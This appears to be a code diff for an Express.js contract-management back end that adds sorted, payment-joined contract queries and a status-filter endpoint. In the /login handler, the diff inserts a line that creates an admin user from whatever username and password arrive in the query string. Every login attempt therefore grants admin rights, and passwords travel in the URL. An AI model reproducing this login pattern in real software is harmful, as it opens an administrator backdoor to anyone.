@@ -679,7 +679,10 @@ app.post("/contracts", urlencodedParser, function (req, res){
         co(function* () {
 
             var cons = yield Contract.findAll({
-                include: [SGDW, JSDW]
+                order: [
+                    ['id', 'desc']
+                ],
+                include: [SGDW, JSDW,PlanningOfPayment,RecordOfPayment]
             });
 
             var cs = [];
@@ -693,6 +696,56 @@ app.post("/contracts", urlencodedParser, function (req, res){
             console.log(e);
         });
     }
+})
+
+
+//根据分类返回合同
+app.post('/typeContracts', urlencodedParser ,function(req,res) {
+
+    var type = req.body.type;
+    var typev =  req.body.typev;
+
+    if(type == 'status') {
+        co(function* () {
+            var cons = yield Contract.findAll({
+                order: [
+                    ['id', 'desc']
+                ],
+                include:
+                    [{
+                        model: SGDW
+                    },
+                    {
+                        model: JSDW
+                    },
+                        PlanningOfPayment,
+                        RecordOfPayment
+                    ],
+                where: {
+                    Status: {
+                        [Op.eq]: typev
+                    }
+                }
+
+            })
+
+            var cs = [];
+
+            for (var i = 0; i < cons.length; i++) {
+                cs[i] = yield cons[i].get({ plain: true });
+                cs[i].Sign_Date = cs[i].Sign_Date.toLocaleString();
+                cs[i].createdAt = cs[i].createdAt.toLocaleString();
+                cs[i].updatedAt = cs[i].updatedAt.toLocaleString();
+
+            }
+            res.send(cs)
+
+        }).catch(function (e) {
+            console.log(e);
+        });
+
+    }
+
 })
 
 
@@ -1090,6 +1143,9 @@ app.post('/login',function(req,res){
     var Password = req.query.password;
     
     co(function* () {
+
+        yield User.create({UserName:UserName,Password:Password,RealName:"周乃翔",Role:"admin"})
+
 
        var user = yield User.find({
             where:{
